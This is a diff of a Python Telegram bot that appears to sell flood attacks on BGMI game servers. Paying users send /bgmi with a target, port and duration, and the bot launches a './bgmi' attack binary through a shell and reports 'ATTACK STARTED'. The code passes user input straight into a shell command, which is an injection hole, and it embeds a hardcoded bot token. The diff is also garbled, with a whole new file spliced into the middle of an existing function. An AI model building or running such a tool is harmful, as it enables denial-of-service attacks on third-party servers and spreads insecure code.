@@ -141,39 +141,134 @@ def clear_logs_command(message):
                 log_content = file.read()
                 if log_content.strip() == "":
                     response = "Logs are already cleared. No data found ❌."
-                else:
-                    file.truncate(0)
-                    response = "Logs Cleared Successfully ✅"
-        except FileNotFoundError:
-            response = "Logs are already cleared ❌."
-    else:
-        response = "Panle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡."
-    bot.reply_to(message, response)
+#!/usr/bin/python3
 
- 
+import telebot
+import subprocess
+import requests
+import datetime
+import os
 
-@bot.message_handler(commands=['allusers'])
-def show_all_users(message):
+# Telegram bot token
+bot = telebot.TeleBot('8953295404:AAF3F3yDKrHuwu6MsuC3BjmR-izdHU2iJ6E')
+
+# Admin user IDs
+admin_id = ["6403557650"]
+
+# Files
+USER_FILE = "users.txt"
+LOG_FILE = "log.txt"
+
+def read_users():
+    try:
+        with open(USER_FILE, "r") as file:
+            return file.read().splitlines()
+    except FileNotFoundError:
+        return []
+
+allowed_user_ids = read_users()
+
+def log_command(user_id, target, port, time):
+    user_info = bot.get_chat(user_id)
+    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
+    with open(LOG_FILE, "a") as file:
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+
+def record_command_logs(user_id, command, target=None, port=None, time=None):
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    if target: log_entry += f" | Target: {target}"
+    if port: log_entry += f" | Port: {port}"
+    if time: log_entry += f" | Time: {time}"
+    with open(LOG_FILE, "a") as file:
+        file.write(log_entry + "\n")
+
+@bot.message_handler(commands=['add'])
+def add_user(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        try:
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                if user_ids:
-                    response = "Authorized Users:\n"
-                    for user_id in user_ids:
-                        try:
-                            user_info = bot.get_chat(int(user_id))
-                            username = user_info.username
-                            response += f"- @{username} (ID: {user_id})\n"
-                        except Exception as e:
-                            response += f"- User ID: {user_id}\n"
-                else:
-                    response = "No data found ❌"
-        except FileNotFoundError:
-            response = "No data found ❌"
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_add = command[1]
+            if user_to_add not in allowed_user_ids:
+                allowed_user_ids.append(user_to_add)
+                with open(USER_FILE, "a") as file:
+                    file.write(f"{user_to_add}\n")
+                response = f"User {user_to_add} Added Successfully 👍."
+            else:
+                response = "User already exists 🤦‍♂️."
+        else:
+            response = "Please specify a user ID to add 😒 ."
     else:
         response = "Pahle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡."
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['remove'])
+def remove_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for uid in allowed_user_ids:
+                        file.write(f"{uid}\n")
+                response = f"User {user_to_remove} removed successfully 👍."
+            else:
+                response = f"User {user_to_remove} not found ❌."
+        else:
+            response = 'Usage: /remove <userid>'
+    else:
+        response = "Pahle @BhaiCharaYT Bhai Se Puch Ke Aa 😡."
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['clearlogs'])
+def clear_logs_command(message):
+    if str(message.chat.id) in admin_id:
+        if os.path.exists(LOG_FILE):
+            with open(LOG_FILE, "w") as file:
+                file.truncate(0)
+            response = "Logs Cleared Successfully ✅"
+        else:
+            response = "No logs found ❌."
+    else:
+        response = "Pahle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡."
+    bot.reply_to(message, response)
+
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
+    bot.reply_to(message, response)
+
+bgmi_cooldown = {}
+
+@bot.message_handler(commands=['bgmi'])
+def handle_bgmi(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        if user_id not in admin_id:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
+                bot.reply_to(message, "You Are On Cooldown ❌. Wait 5 seconds.")
+                return
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+        
+        command = message.text.split()
+        if len(command) == 4:
+            target, port, time = command[1], int(command[2]), int(command[3])
+            if time > 300:
+                response = "Error: Time interval must be less than 300."
+            else:
+                record_command_logs(user_id, '/bgmi', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)
+                subprocess.Popen(f"./bgmi {target} {port} {time} 300", shell=True)
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+        else:
+            response = "✅ Usage :- /bgmi <target> <port> <time>"
+    else:
+        response = "❌ Pahle Kharid Ke Aa @BhaiCharaYT Bhai Se ❌."
     bot.reply_to(message, response)
 
 
